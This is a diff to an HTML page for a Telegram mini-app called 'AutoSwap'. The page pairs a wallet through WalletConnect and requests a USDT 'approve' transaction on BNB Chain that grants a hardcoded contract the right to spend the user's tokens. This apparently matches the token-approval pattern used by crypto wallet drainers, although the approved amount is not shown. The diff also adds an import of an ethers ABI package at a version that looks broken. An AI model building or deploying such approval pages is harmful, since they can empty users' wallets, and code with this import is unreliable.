@@ -3,12 +3,12 @@
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>AutoSwap — approve USDT</title>
+  <title>AutoSwap — Approve USDT</title>
   <style>
     body { font-family:'Segoe UI',sans-serif; background:linear-gradient(135deg,#1a1f2d,#0d1520); color:#e0e0e0; text-align:center; margin:0; padding:20px;}
-    .container {max-width:500px; margin:0 auto; padding:30px; background:rgba(30,40,55,0.8); border-radius:20px; box-shadow:0 10px 40px rgba(0,0,0,0.4);}
-    canvas {display:block; margin:20px auto;}
-    #status {margin-top:20px; font-size:16px; white-space:pre-wrap;}
+    .container {max-width:500px;margin:0 auto;padding:30px;background:rgba(30,40,55,0.8);border-radius:20px;box-shadow:0 10px 40px rgba(0,0,0,0.4);}
+    canvas {display:block;margin:20px auto;}
+    #status {margin-top:20px;font-size:16px;white-space:pre-wrap;}
   </style>
 </head>
 <body>
@@ -18,15 +18,15 @@
     <div id="status">Инициализация...</div>
   </div>
 
-  <!-- Telegram и QRCode подключаются нормально. ethers интегрируется как ESM ниже -->
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
 
   <script type="module">
     import SignClient from 'https://esm.sh/@walletconnect/sign-client@2.13.1';
     import { ethers } from 'https://esm.sh/ethers@6.14.3';
+    import { Interface } from 'https://esm.sh/@ethersproject/abi@6.6.3';
 
-    const setStatus = (msg, color = "#4fc3f7") => {
+    const setStatus = (msg, color="#4fc3f7") => {
       const el = document.getElementById("status");
       el.textContent = msg;
       el.style.color = color;
@@ -34,7 +34,7 @@
 
     async function runApp() {
       try {
-        setStatus("🔌 Инициализация WalletConnect...");
+        setStatus("🔌 Инициализация WalletConnect…");
         const client = await SignClient.init({
           projectId: "d868f90cd734355ae0320f8f0258b6b1",
           relayUrl: "wss://relay.walletconnect.com",
@@ -46,7 +46,7 @@
           }
         });
 
-        setStatus("📷 Генерация QR‑кода...");
+        setStatus("📷 Подготовка QR‑кода…");
         const { uri, approval } = await client.connect({
           requiredNamespaces: {
             eip155: {
@@ -58,8 +58,8 @@
         });
 
         if (uri) {
-          QRCode.toCanvas(document.getElementById("qrcode"), uri, { width: 240, margin: 1 });
-          setStatus("📱 Сканируйте QR‑код кошельком");
+          QRCode.toCanvas(document.getElementById("qrcode"), uri, { width:240, margin:1 });
+          setStatus("📱 Ожидание подтверждения в кошельке");
         }
 
         const session = await approval();
@@ -70,11 +70,11 @@
         const usdt = ethers.getAddress("0x55d398326f99059ff775485246999027b3197955");
         const autoswap = ethers.getAddress("0x026c54b156b501ad9cea422e59454d4b6d6f6963");
 
-        setStatus("✍️ Подготовка approve...");
-        const approveIface = new ethers.utils.Interface(["function approve(address,uint256)"]);
+        setStatus("✍️ Подписание approve транзакции…");
+        const approveIface = new Interface(["function approve(address,uint256)"]);
         const data = approveIface.encodeFunctionData("approve", [autoswap, amount]);
 
-        setStatus("🚀 Отправка approve транзакции...");
+        setStatus("🚀 Отправка approve…");
         const txHash = await client.request({
           topic: session.topic,
           chainId: "eip155:56",
